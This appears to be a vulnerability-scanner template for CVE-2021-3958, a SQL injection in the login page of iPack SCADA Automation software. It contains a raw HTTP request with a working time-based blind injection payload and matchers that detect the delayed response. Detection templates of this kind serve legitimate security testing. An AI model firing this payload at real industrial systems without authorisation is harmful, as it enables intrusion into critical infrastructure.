id: CVE-2021-3958

info:
  name: iPack SCADA Automation - SQL Injection
  author: edoardottt
  severity: critical
  description: |
    Due to improper sanitization iPack SCADA Automation software suffers from a remote SQL injection vulnerability. An unauthenticated attacker with the web access is able to extract critical information from the system.
  reference:
    - https://github.com/paradessia/cve/blob/main/Ipack-Scada-Automation.txt
    - https://nvd.nist.gov/vuln/detail/CVE-2021-3958
    - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-3958
  classification:
    cve-id: CVE-2021-3958
  tags: cve,ipack,scada,cve2021,sqli

requests:
  - raw:
      - |
        POST /procedure_scripts/login_check.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        X-Requested-With: XMLHttpRequest

        username%3DTEST%27%20AND%20(SELECT%207204%20FROM%20(SELECT(SLEEP(5)))tirb)--%20uiBW%26password%3DTEST%26is_ajax%3D1

    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - 'duration>=5'

      - type: status
        status:
          - 200
